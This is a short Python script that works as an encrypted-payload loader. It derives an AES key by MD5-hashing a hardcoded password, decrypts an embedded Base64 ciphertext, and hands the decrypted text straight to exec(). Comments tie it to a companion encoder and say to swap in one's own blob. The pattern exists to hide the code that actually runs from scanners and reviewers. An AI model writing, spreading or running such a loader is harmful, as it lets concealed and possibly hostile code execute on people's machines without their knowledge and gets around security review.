import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64
import tempfile
import subprocess

# Constant key (same as encoder)
PASSWORD = "tiqny2q2je"
KEY = hashlib.md5(PASSWORD.encode()).digest()  # 16-byte AES-128 key

# Base64-encoded encrypted data (replace with your actual Base64 string)
ENCRYPTED_BASE64 = """Q3pKwHUkx/fiPl13GSQaOJuDwH26boMVCenua8R/A3V5qrQNOEdFi+2xotvyyJGlzl2QLUBe08dkRZg+KG52hP+JWrXxbQbjiP4ICYhumGXKBCqdHi6fN7VX6y998VCoHBMBRntkXuaxk2ckE8jEtK5KwTX90Tg1oJAyel1TyZHZZDtEhHY17qWcObeXkP9u/PsWtWErVtD6MvICuhKjpA2HQtYFpuesO75ZH+FECZkf7fk9ocECs+vAkZs363m2bFrIKAQ9fVVPqX3s24lBElGM4XoIx5rwNuzzdPxPx0nrJ/KhKZTxzGigRXsObjkr3KMc26Mlv5Cd/n6nfM0p3Yua/mUyF8A/c4cJxBCVuPhy//n/l6P2aLnf/9L+v4FoHmGBNV4ivxnGi4UAF054JXssdbQOSWLFq+95IGFMEe2lCg0N6vmh04+/ybfelF7Vx2xx4rrbkRh3graN4uAzNMVKq5XYx1wePnlI8aI/1vTMvQCCdtYkJ47BIVtl58z0LbImpDOootnNjf2H5DiiktksDx/dQ4hy8MevAJiJFbKuINdUdEtsSri3L21ySdh3YihVX/geltH0nimBMnwEw8Kp0Y32CT/4RNqx79GJlJodsohfSbi7ZAmsBWz2cvgPhivhnPiNqkVmZ07Mm0qNywFw9rP4lL0Qg6z9/0UC92UKXpjH23W3Ti5exhuPOCUVCy35Zd9PCh5VCWJW2QcEUHTd+tt90kF6o80VJ4WDg3pTZLqcWQiqX7mb9O9aF0coj7067To8hvij7Fqxo/XThipDYXW6Yre2z4L7oHiez0SYhzk1k4/v7T0A8HXgokB6pyq/TWJa+1Ake3J681dIHgXuOTH48UkPIPdBhro8U5cbBnD3QwekuNl2IXISD5FhhIFhrvIe4G4N/sHujSp5fDPt9yM3bo3AHRUr5hmFD7dgANBTE+t0uVvPeaMiDNCGM7J7z/peG0ELhTupU/Cxxn2wE+UZIP+KbaoGO4RRoqs="""

def decrypt_and_execute():
    try:
        # Decode Base64 to get IV + ciphertext
        data = base64.b64decode(ENCRYPTED_BASE64.strip())
        
        # Extract IV (first 16 bytes) and ciphertext (rest)
        iv = data[:16]
        ciphertext = data[16:]
        
        # Decrypt
        cipher = AES.new(KEY, AES.MODE_CBC, iv)
        decrypted_code = unpad(cipher.decrypt(ciphertext), AES.block_size).decode('utf-8')
        
        print("[+] Decrypted code successfully. Executing...")
        
        # Option 1: Direct execution (dangerous if code is untrusted)
        exec(decrypted_code)
        
        
        return True
    
    except Exception as e:
        print(f"[!] Failed: {e}")
        return False

if __name__ == "__main__":
    decrypt_and_execute()  # No file input needed